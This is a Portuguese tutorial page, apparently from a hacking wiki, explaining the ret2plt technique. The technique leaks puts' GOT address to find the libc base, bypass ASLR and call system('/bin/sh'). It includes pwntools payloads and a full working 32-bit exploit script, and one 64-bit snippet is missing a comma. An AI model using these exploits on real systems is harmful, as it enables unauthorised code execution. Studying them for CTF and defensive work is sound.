# Ret2plt

## Informações Básicas

O objetivo desta técnica seria **vazar um endereço de uma função do PLT** para poder contornar o ASLR. Isso ocorre porque, por exemplo, se você vazar o endereço da função `puts` da libc, você pode então **calcular onde está a base da `libc`** e calcular offsets para acessar outras funções como **`system`**.

Isso pode ser feito com um payload `pwntools` como ([**aqui**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt\_and\_got)):
```python
# 32-bit ret2plt
payload = flat(
b'A' * padding,
elf.plt['puts'],
elf.symbols['main'],
elf.got['puts']
)

# 64-bit
payload = flat(
b'A' * padding,
POP_RDI,
elf.got['puts']
elf.plt['puts'],
elf.symbols['main']
)
```
Observe como o **`puts`** (usando o endereço do PLT) é chamado com o endereço do `puts` localizado na GOT (Tabela de Deslocamento Global). Isso ocorre porque, no momento em que o `puts` imprime a entrada da GOT do `puts`, esta **entrada conterá o endereço exato do `puts` na memória**.

Também observe como o endereço do `main` é usado no exploit, para que quando o `puts` encerre sua execução, o **binário chame `main` novamente em vez de sair** (para que o endereço vazado continue válido).

{% hint style="danger" %}
Observe que, para que isso funcione, o **binário não pode ser compilado com PIE** ou você deve ter **encontrado um vazamento para contornar o PIE** a fim de saber o endereço do PLT, GOT e main. Caso contrário, você precisará contornar o PIE primeiro.
{% endhint %}

Você pode encontrar um [**exemplo completo desse contorno aqui**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/ret2plt-aslr-bypass). Este foi o exploit final desse **exemplo**:
```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
libc = elf.libc
p = process()

p.recvline()

payload = flat(
'A' * 32,
elf.plt['puts'],
elf.sym['main'],
elf.got['puts']
)

p.sendline(payload)

puts_leak = u32(p.recv(4))
p.recvlines(2)

libc.address = puts_leak - libc.sym['puts']
log.success(f'LIBC base: {hex(libc.address)}')

payload = flat(
'A' * 32,
libc.sym['system'],
libc.sym['exit'],
next(libc.search(b'/bin/sh\x00'))
)

p.sendline(payload)

p.interactive()
```
## Outros exemplos e Referências

* [https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html)
* 64 bits, ASLR ativado mas sem PIE, o primeiro passo é preencher um estouro de buffer até o byte 0x00 do canário e então chamar puts para vazá-lo. Com o canário, um ROP gadget é criado para chamar puts e vazar o endereço de puts da GOT e um ROP gadget para chamar `system('/bin/sh')`.
* [https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html)
* 64 bits, ASLR ativado, sem canário, estouro de pilha em main a partir de uma função filha. ROP gadget para chamar puts e vazar o endereço de puts da GOT e então chamar um one gadget.
